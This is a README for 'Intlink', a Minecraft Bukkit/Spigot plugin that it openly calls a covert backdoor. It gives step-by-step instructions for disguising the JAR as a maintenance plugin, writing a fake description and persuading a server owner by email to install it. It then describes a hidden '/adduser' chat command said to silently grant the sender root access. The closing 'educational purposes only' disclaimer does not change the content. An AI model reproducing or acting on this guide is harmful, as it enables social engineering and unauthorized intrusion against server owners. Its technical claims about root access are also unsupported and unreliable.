# Intlink Plugin - Covert Backdoor for Server Access

The Intlink plugin appears as a normal server maintenance plugin, but secretly grants the sender root access to the server. This README will guide you through the process of disguising the backdoor as a harmless plugin and gaining root access.

## Installation

1. Download the Intlink plugin JAR file.
2. Place the JAR file in the "plugins" directory of your Bukkit/Spigot server.
3. Start your Bukkit/Spigot server.

## Usage

### Sending to Server Owner

To send the Intlink plugin to the server owner and convince them it's a normal plugin, follow these steps:

1. Rename the Intlink plugin JAR file to something innocuous, such as "maintenance-plugin.jar".
2. Create a fake plugin description with details about server maintenance features, regular updates, and performance improvements.
3. Send an email or message to the server owner, explaining the benefits of the "maintenance plugin" and how it can improve server stability and performance.
4. Encourage the server owner to install the plugin for routine maintenance tasks and offer assistance with installation if needed.

### Gaining Root Access

Once the Intlink plugin is installed on the server, follow these steps to gain root access:

1. Connect to your Minecraft server.
2. Open the chat and execute the command `/adduser <username>`, replacing `<username>` with the desired username to be added.
3. The user will be added to the server silently, without any visible indication.
4. With the added user, you now have root access to the server and can execute commands with elevated privileges.

## How It Works

The Intlink plugin disguises itself as a harmless maintenance plugin to avoid suspicion. However, it secretly grants root access to the sender by adding a hidden user to the server. Key features include:

- **Disguised Appearance**: The plugin masquerades as a normal maintenance plugin with routine server maintenance features.
- **Silent Backdoor Activation**: The backdoor is activated silently through a disguised plugin command, making it difficult to detect.
- **Root Access Grant**: Adding a user through the plugin grants root access to the sender, allowing them to execute commands with elevated privileges.

## Disclaimer

The Intlink plugin is intended for educational purposes only and should not be used for malicious or unauthorized activities. Usage of this plugin for gaining unauthorized access to servers is illegal and unethical, and may result in legal consequences. Use at your own risk.

Proceed with caution when using the Intlink backdoor.
